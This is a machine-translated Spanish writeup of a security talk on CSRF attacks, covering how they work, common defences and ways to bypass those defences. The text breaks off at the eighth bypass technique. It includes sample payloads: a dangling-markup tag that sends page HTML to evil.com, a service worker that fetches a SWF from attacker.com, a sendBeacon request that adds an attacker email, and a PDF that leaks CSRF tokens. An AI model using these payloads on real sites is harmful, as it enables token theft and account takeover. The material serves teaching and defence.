<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üò∑ üëéüèæ üçÆ Las vulnerabilidades CSRF siguen siendo relevantes üöà üßîüèº üå§Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="CSRF (falsificaci√≥n de solicitudes de sitios cruzados) traducido al ruso es una falsificaci√≥n de solicitudes de sitios cruzados. Mikhail Egorov ( 0ang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Las vulnerabilidades CSRF siguen siendo relevantes</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/">  CSRF (falsificaci√≥n de solicitudes de sitios cruzados) traducido al ruso es una falsificaci√≥n de solicitudes de sitios cruzados.  <strong>Mikhail Egorov</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">0ang3el</a> ) en su informe sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Highload ++</a> 2017 habl√≥ sobre las vulnerabilidades CSRF, sobre qu√© mecanismos de protecci√≥n se usan generalmente y c√≥mo se pueden eludir de todos modos.  Y al final, trajo una serie de consejos sobre c√≥mo defenderse adecuadamente contra los ataques CSRF.  Bajo decodificaci√≥n de gato de esta actuaci√≥n. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>Sobre el orador:</strong> Mikhail Egorov trabaja en Ingram Micro Cloud y se dedica a la seguridad de aplicaciones.  En su tiempo libre, Mikhail se dedica a la b√∫squeda de vulnerabilidades y b√∫squeda de errores y habla en conferencias de seguridad. <br><br>  <strong>Descargo de responsabilidad:</strong> la informaci√≥n proporcionada es puramente la opini√≥n del autor, todas las coincidencias son aleatorias. <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br>  Este monstruo de las cookies tiene la culpa del hecho de que los ataques CSRF funcionan.  El hecho es que muchas aplicaciones web usan cookies (en adelante consideramos apropiado llamar cookies en ruso) para controlar la sesi√≥n del usuario.  El navegador est√° dise√±ado para que, si tiene cookies de usuario para este dominio y ruta, las env√≠e autom√°ticamente junto con la solicitud HTTP. <br><a name="habracut"></a><br><h3>  Cookies <br></h3><br>  Una cookie es un peque√±o dato que un servidor web env√≠a a un cliente en forma de nombre = valor en un encabezado HTTP llamado "Set-Cookie".  El navegador almacena estos datos en la computadora del usuario y, cuando sea necesario, env√≠a estos datos al servidor web como parte de una solicitud HTTP en un encabezado HTTP llamado "Cookie". <br><br>  Las cookies pueden tener varios atributos, como: caduca, dominio, seguro, httponly: <br><br>  Las cookies aparecieron por primera vez en el navegador Netscape en 1994.  Muchas aplicaciones web todav√≠a las usan para administrar la sesi√≥n de un usuario. <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br>  Veamos c√≥mo funciona el cl√°sico ataque Cross Site Request Forgery (CSRF). <br><br>  Digamos que nuestra aplicaci√≥n web tiene la capacidad de cambiar la direcci√≥n de entrega del usuario y utiliza cookies para controlar la sesi√≥n. <br><br>  Tenemos un formulario HTML que el usuario debe completar: ingrese la direcci√≥n y haga clic en el bot√≥n "Guardar".  Como resultado, una solicitud POST con un formulario HTML volar√° al backend.  Vemos que el navegador configura autom√°ticamente las cookies de sesi√≥n del usuario.  El backend, cuando recibe dicha solicitud, ve que existe tal sesi√≥n, es un usuario leg√≠timo y cambia su direcci√≥n de entrega. <br><br>  ¬øQu√© puede hacer un atacante? <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br>  Puede colocar una p√°gina HTML en su sitio <em>attacker.com</em> que realmente env√≠e el formulario HTML como <em>ejemplo</em> <em>.</em>  <em>com</em> .  Dado que el navegador inserta autom√°ticamente las cookies del usuario en la solicitud HTTP, el backend simplemente no entender√° si la solicitud es leg√≠tima, es el resultado de completar el formulario por el usuario o es un ataque CSRF, y cambiar√° la direcci√≥n de entrega del usuario a un valor que sea beneficioso para el atacante . <br><br>  Hay otra opci√≥n para un ataque CSRF utilizando la API XHR.  Si muchos han escuchado sobre el ataque CSRF usando formularios HTML, entonces saben menos sobre este m√©todo, pero tambi√©n funciona. <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br>  Tenga en cuenta el atributo withCredentials, que hace que el navegador env√≠e autom√°ticamente cookies de usuario.  Como el valor de Content-type es application / x-www-form-urlencoded, el navegador enviar√° esta solicitud sin la solicitud de verificaci√≥n previa de opciones CORS, y nuevamente el ataque CSRF funcionar√°. <br><br>  Consideremos m√°s claramente c√≥mo sucede esto. <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br>  Datos de origen: <br><br><ul><li>  aplicaci√≥n <i>example.com</i> que es vulnerable a CSRF, <br></li><li>  usuario <br></li><li>  sitio del atacante, donde hay una p√°gina csrf-xhr.html. <br></li></ul><br>  El usuario se autentica en la aplicaci√≥n, que se encuentra en <i>example.com</i> .  Si va al sitio del atacante, se ejecutar√° autom√°ticamente una solicitud POST, que cambiar√° la direcci√≥n de entrega.  El navegador insertar√° autom√°ticamente cookies de sesi√≥n en la solicitud y el backend cambiar√° la direcci√≥n. <br><br><h2>  Historial de ataques CSRF <br></h2><br>  En general, los ataques CSRF se conocen desde 2001, cuando comenzaron a explotarse activamente.  En el per√≠odo 2008-2012, tales vulnerabilidades estaban en cada primer sitio, incluyendo: <br><br><ol><li>  YouTube <br></li><li>  The New York Times; <br></li><li>  Badoo <br></li><li>  Slideshare <br></li><li>  Vimeo; <br></li><li>  Hulu <br></li><li>  B√∫squeda de cine; <br></li><li>  ... <br></li></ol><br><h2>  ¬øQu√© tan graves son las vulnerabilidades CSRF? <br></h2><br>  De hecho, todo depende de la criticidad de la acci√≥n vulnerable.  Podr√≠a ser: <br><br><ul><li>  Adquisici√≥n de cuenta: el atacante captura la cuenta de la v√≠ctima cambiando el correo electr√≥nico a trav√©s de CSRF. <br></li><li>  Escalada de privilegios: aumento de privilegios debido al hecho de que el atacante a trav√©s de CSRF crea un nuevo usuario con altos derechos en el sistema. <br></li><li>  Ejecuci√≥n remota de c√≥digo: ejecuci√≥n de c√≥digo debido a la operaci√≥n de inyecci√≥n de comandos en el panel de administraci√≥n a trav√©s de CSRF. <br></li></ul><br>  Veamos qu√© dicen las clasificaciones de vulnerabilidad establecidas internacionalmente sobre la gravedad de CSRF. <br><br>  En el proyecto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">OWASP Top 10</a> , que contiene las 10 vulnerabilidades m√°s cr√≠ticas de la aplicaci√≥n, en 2010 las vulnerabilidades CSRF ocuparon el <strong>quinto lugar</strong> .  Luego, los desarrolladores comenzaron a implementar varias opciones de protecci√≥n, y ya en 2013 las vulnerabilidades CSRF se trasladaron a la 8¬™ posici√≥n. <br><br>  Las vulnerabilidades CSRF no se incluyeron en la lista para 2017, porque supuestamente seg√∫n las estad√≠sticas, ahora se encuentran en las pruebas de penetraci√≥n <strong>solo en el 8% de los casos</strong> . <br><br>  Personalmente, no estoy de acuerdo con estas estad√≠sticas, porque literalmente en los √∫ltimos dos a√±os he encontrado muchas vulnerabilidades CSRF.  A continuaci√≥n te contar√© c√≥mo lo hice. <br><br>  En la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">clasificaci√≥n Bugcrowd VRT</a> (Taxonom√≠a de calificaci√≥n de vulnerabilidad), las vulnerabilidades CSRF de toda la aplicaci√≥n tienen una calificaci√≥n de gravedad de P2 (Alta).  Solo la gravedad cr√≠tica est√° arriba, es decir, estas son <strong>vulnerabilidades bastante serias</strong> . <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br>  Considere qu√© opciones de protecci√≥n CSRF existen y c√≥mo funciona cada una de las opciones de protecci√≥n. <br><br>  <strong>1. token CSRF</strong> <br><ul><li>  Para cada sesi√≥n de usuario, se genera un token √∫nico y <strong>altamente</strong> entr√≥pico. <br></li><li>  El token se inserta en el DOM de la p√°gina HTML o se le da al usuario a trav√©s de la API. <br></li><li>  El usuario con cada solicitud asociada con cualquier cambio debe enviar un token en el par√°metro o en el encabezado HTTP de la solicitud. <br></li><li>  Como el atacante no conoce el token, el cl√°sico ataque CSRF no funciona. <br></li></ul><br>  <strong>2. Enviar doble cookie</strong> <br><ul><li>  Nuevamente, se genera un token √∫nico y <strong>altamente</strong> entr√≥pico para cada sesi√≥n de usuario, pero se coloca en cookies. <br></li><li>  El usuario debe pasar los mismos valores en la solicitud en la solicitud y en el par√°metro de solicitud. <br></li><li>  Si estos dos valores coinciden en las cookies y en el par√°metro, se considera que esta es una solicitud leg√≠tima. <br></li><li>  Dado que el atacante simplemente no puede cambiar las cookies en el navegador del usuario, el ataque CSRF cl√°sico no funciona. <br></li></ul><br>  <strong>3. Protecci√≥n basada en el tipo de contenido</strong> <br><ul><li>  El usuario debe enviar una solicitud con un encabezado de tipo de contenido espec√≠fico, por ejemplo, application / json. <br></li><li>  Dado que es imposible enviar un origen cruzado arbitrario de tipo de contenido en el navegador a trav√©s del formulario HTML o la API XHR, el ataque CSRF cl√°sico no funciona nuevamente. <br></li></ul><br>  <strong>4. Protecci√≥n basada en referencias</strong> <br><ul><li>  El usuario debe enviar una solicitud con un valor de encabezado Referer espec√≠fico.  El backend lo comprueba, si es incorrecto, se considera que se trata de un ataque CSRF. <br></li><li>  Dado que el navegador no puede enviar un √°rbitro arbitrario a trav√©s de un formulario HTML o API XHR, el ataque CSRF cl√°sico no funciona. <br></li></ul><br>  <strong>5. Confirmaci√≥n de contrase√±a / websudo</strong> <br><ul><li>  El usuario debe confirmar la acci√≥n con una contrase√±a (o secreto). <br></li><li>  Como el atacante no lo conoce, el cl√°sico ataque CSRF no funciona. <br></li></ul><br>  <strong>6. Cookies SameSite en Chrome, Opera</strong> <br>  Esta es una nueva tecnolog√≠a dise√±ada para proteger contra CSRF.  Por el momento, solo funciona en dos navegadores (Chrome, Opera). <br><br><ul><li>  Una cookie se establece con un atributo adicional: samesite, que puede tener dos valores: lax o estricto. <br></li><li>  La esencia de la tecnolog√≠a es que el navegador no env√≠a cookies si la solicitud se realiza desde otro dominio, por ejemplo, desde el sitio web del atacante.  Por lo tanto, esto nuevamente protege contra el ataque cl√°sico de CSRF. <br></li></ul><br>  Pero, desafortunadamente, en todas partes hay caracter√≠sticas de navegadores, aplicaciones web y su implementaci√≥n, que a veces le <strong>permiten evitar la protecci√≥n CSRF</strong> . <br><br>  Por lo tanto, ahora hablemos de <strong>8 formas de evitar la protecci√≥n</strong> que se pueden usar en la pr√°ctica. <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>Escenarios de soluciones:</strong> <br></h3><br>  <strong>1. XSS (cross-sites scriptting)</strong> <br><br>  Si su aplicaci√≥n web tiene XSS, esto autom√°ticamente la hace vulnerable a CSRF, y es dif√≠cil protegerse de esto.  <strong>Solo puedes aguantar</strong> . <br><br>  <strong>2. Marcado colgante</strong> <br><br>  Digamos que nuestra aplicaci√≥n tiene una vulnerabilidad a la inyecci√≥n de HTML, pero no hay XSS.  Por ejemplo, hay una Pol√≠tica de seguridad de contenido (CSP) que protege contra XSS.  Pero un atacante a√∫n puede incrustar etiquetas HTML. <br><br>  Si nuestra aplicaci√≥n implementa protecci√≥n basada en tokens CSRF, el atacante puede incrustar dicho HTML, estos no son im√°genes cerradas o etiquetas de formulario: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Como resultado, parte de la p√°gina HTML DOM se enviar√° al recurso del atacante.  Es muy probable que si el atacante implementa correctamente dicho HTML, lo que viene al sitio del atacante contendr√° un token CSRF. <br><br>  Por lo tanto, habiendo aprendido el token, el atacante podr√° explotar CSRF de la manera cl√°sica. <br><br>  <strong>3. Subdominio vulnerable</strong> <br><br>  Supongamos que tenemos un subdominio <em>foo.example.com</em> , y es vulnerable a la <strong>adquisici√≥n del subdominio</strong> o <strong>XSS.</strong>  Como resultado de la adquisici√≥n del subdominio, el atacante controla completamente el subdominio y puede agregar cualquier p√°gina HTML all√≠ o ejecutar c√≥digo JS en el contexto del subdominio.  Si nuestro subdominio es vulnerable a tales cosas, entonces el atacante podr√° eludir los siguientes tipos de protecci√≥n CSRF: <br><br><ul><li>  Fichas CSRF; <br></li><li>  Cookie de doble env√≠o; <br></li><li>  Protecci√≥n basada en el tipo de contenido. <br></li></ul><br>  Digamos que nuestra aplicaci√≥n principal utiliza <strong>CORS</strong> (Cross-Origin Resource Sharing) para la comunicaci√≥n entre dominios.  Se insertan dos encabezados en la respuesta del servidor: <br><br><ol><li>  Access-Control-Allow-Origin: foo.example.com (foo.example.com - subdominio vulnerable); <br></li><li>  Access-Control-Allow-Credentials: verdadero <strong>&nbsp;</strong>  - para que utilizando la API XHR sea posible realizar una solicitud con cookies de usuario. <br></li></ol><br>  Si se cumplen estas condiciones, el atacante puede simplemente leer el token CSRF del subdominio que controla y continuar explotando el CSRF de la manera cl√°sica. <br><br>  La proxima opcion.  Supongamos que hay un archivo <strong>crossdomain.xml</strong> en el dominio principal que queremos atacar.  Este archivo es utilizado por los complementos flash y PDF para la interacci√≥n del subdominio, y se permite el acceso a √©l desde cualquier subdominio. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Si el atacante puede cargar el archivo JS en <i>foo.example.com</i> , en este caso puede usar la API de Service Worker para el subdominio foo.example.com, que en realidad entrega el archivo flash. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br>  Como tenemos crossdomain.xml en el dominio principal, que permite la interacci√≥n de subdominios, el atacante simplemente lee el token CSRF a trav√©s de este SWF. <br><br><blockquote>  Por cierto, recientemente se encontr√≥ una vulnerabilidad similar en Amazon, m√°s detalles <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br></blockquote><br>  Incluso si CORS no est√° configurado y no hay un archivo crossdomain.xml, pero se utiliza la protecci√≥n de cookies de env√≠o doble, un atacante puede simplemente insertar cookies del subdominio para el dominio principal en la ruta donde desea explotar CSRF, y as√≠ evitar la protecci√≥n de cookies de env√≠o doble. <br><br>  <strong>4. PDF incorrecto</strong> <br><br>  Esta soluci√≥n alternativa se basa en PDF.  Adobe tiene un complemento PDF que se instala autom√°ticamente cuando instala Adobe Reader.  Este complemento es compatible con el llamado script FormCalc.  Sin embargo, ahora el complemento PDF de Adobe solo funciona en IE11 y Firefox ESR. <br><br>  FormCalc tiene dos excelentes m√©todos: get () y post ().  Un atacante que usa el m√©todo get puede leer el token CSRF, usar post y enviarlo a su sitio.  Entonces el atacante obtiene el token CSRF de la v√≠ctima. <br><br>  Supongamos que tenemos la capacidad de subir un archivo PDF a una aplicaci√≥n web.  De hecho, incluso puede ser un archivo de un formato diferente, por ejemplo, un atacante puede intentar descargar un PDF bajo la apariencia de una imagen, que es el avatar del usuario. <br><br>  La aplicaci√≥n tiene alguna API en el dominio principal, que le permite obtener el contenido del archivo descargado.  Luego, el atacante puede usar una p√°gina HTML que incrusta el archivo PDF que el atacante subi√≥ a <i>example.com</i> usando la etiqueta de inserci√≥n. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Archivo <strong>Leak.pdf</strong> : <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br>  Este archivo contiene un script FormCalc, que solo lee la p√°gina Settings.action, donde hay un token CSRF en el DOM y lo env√≠a usando el m√©todo de publicaci√≥n al sitio del atacante. <br><br>  Dado que el PDF se descarga de example.com, este PDF tiene acceso completo a todo el origen <code>https://example.com</code> , y puede leer datos desde all√≠ sin violar el modo de Pol√≠tica del mismo origen (SOP). <br><br>  Un enfoque adicional es que para el complemento PDF no importa con qu√© tipo de contenido se proporcione el archivo PDF, e incluso la respuesta HTTP puede contener otros encabezados (por ejemplo, Content-Disposition).  El complemento PDF a√∫n representar√° este PDF y ejecutar√° el script FormCalc. <br><br>  <strong>5. Inyecci√≥n de galletas</strong> <br><br>  Si se utiliza la protecci√≥n de cookies de env√≠o doble, entonces si el atacante puede introducir cookies de alguna manera, entonces se acab√≥ el juego. <br><br>  Una de las opciones m√°s populares en este escenario es la <strong>inyecci√≥n de</strong> <strong>CRLF</strong> . <br><br>  Si el atacante puede insertar encabezados adicionales en la respuesta del servidor, simplemente puede agregar el encabezado Set-Cookie con las cookies necesarias y omitir la protecci√≥n CSRF. <br><br>  Otra opci√≥n est√° relacionada con <strong>las funciones de manejo de cookies del navegador</strong> . <br><br>  Por ejemplo, en Safari, puede usar comas para insertar nuevas cookies (cookies separadas por comas).  Supongamos que tenemos un par√°metro de URL en el encabezado llamado idioma.  Lo procesamos y escribimos el valor de idioma seleccionado para el usuario en cookies.  Si el atacante inserta una coma, puede insertar cookies adicionales con cualquier nombre. <br><br>  Adem√°s, eludir la protecci√≥n CSRF puede ayudar a <strong>los errores del navegador</strong> .  Por ejemplo, en Firefox fue posible incrustar cookies a trav√©s de una imagen SVG ( <strong>CVE-2016-9078)</strong> .  Si tenemos un editor HTML y permitimos que el usuario inserte etiquetas de imagen, entonces el atacante puede simplemente apuntar a la imagen SVG en el atributo SRC, que establecer√° las cookies necesarias. <br><br>  <strong>6. Cambiar tipo de contenido</strong> <br><blockquote>  Algunos desarrolladores creen que si usa un formato de datos no est√°ndar en el cuerpo de una solicitud POST para comunicarse con el back-end, esto puede salvarlo de CSRF.  Este no es realmente el caso. <br></blockquote><br>  Como ejemplo, citar√© una vulnerabilidad que encontr√© recientemente en un servicio de administraci√≥n de notas muy popular. <br><br>  Us√≥ una API que usa Apache Thrift (formato de datos binarios) y cookies para controlar la sesi√≥n.  Por ejemplo, para agregar una nueva nota, el usuario tuvo que enviar dicha solicitud POST.  Los datos binarios se transmitieron en el cuerpo y Content-Type: se especific√≥ application / x-thrift. <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br>  De hecho, este tipo de contenido no fue validado en el backend.  Fue posible cambiarlo a texto / sin formato y usar la API XHR para explotar esta vulnerabilidad CSRF simplemente pasando datos binarios en el cuerpo de la solicitud POST. <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br>  De hecho, la seguridad basada en el tipo de contenido es una opci√≥n de seguridad muy pobre.  Se pasa por alto en la mayor√≠a de los casos. <br><br>  <strong>7. Tipo de contenido no simple</strong> <br><br>  A trav√©s del formulario HTML o usando la API XHR, podemos enviar los siguientes tipos de contenido: <br><br><ul><li>  texto / sin formato; <br></li><li>  application / x-www-form-urlencoded; <br></li><li>  multipart / form-data. <br></li></ul><br>  De hecho, es posible enviar cualquier valor de tipo de contenido a trav√©s de: <br><br><ul><li>  errores en los navegadores (por ejemplo, Navigator.sendBeacon); <br></li><li>  complementos: complemento Flash + redireccionamiento 307 y complemento PDF + redireccionamiento 307; <br></li><li>  marcos de backend. <br></li></ul><br>  Algunos marcos, como el marco JAX-RS Apache CXF, admiten un par√°metro <strong>llamado ctype</strong> en la URL.  Puede especificar cualquier tipo de contenido en este par√°metro, el backend lo ver√° y lo usar√° en lugar del tipo de contenido, que se pasa al encabezado ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">enlace</a> a la fuente). <br><br>  Se encontr√≥ un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">error</a> bastante <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">conocido</a> en el navegador Chrome en 2015, despu√©s de lo cual, despu√©s de aproximadamente un mes, entr√≥ en acceso p√∫blico, pero solo se solucion√≥ en 2017.  Este error le permiti√≥ enviar una solicitud POST con cualquier tipo de contenido a otro origen utilizando una API llamada <strong>Navigator.sendBeacon ().</strong> <br>  ¬øC√≥mo se ve√≠a la operaci√≥n? <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Creamos un nuevo blob con el Content-Type deseado y simplemente lo enviamos usando Navigator.sendBeacon (). <br><br>  Otro escenario de soluci√≥n alternativa que todav√≠a funciona y es compatible con los navegadores es omitir el uso del complemento flash. <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br>  Incluso hay un sitio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">thehackerblog.com</a> , donde ya hay una unidad flash lista, solo tiene que especificar la URL, el encabezado, el tipo de contenido deseado y los datos que necesita transferir: env√≠a y una solicitud POST con el tipo de contenido deseado vuela al backend. <br><br>  Pero hay un truco: no puede especificar la URL del sitio que estamos atacando.  Debe especificar el recurso que <strong>redirigir√°</strong> <strong>con el c√≥digo 307</strong> en el recurso que estamos atacando.  Entonces funcionar√°. <br><br>  <strong>8. Referente de parodia</strong> 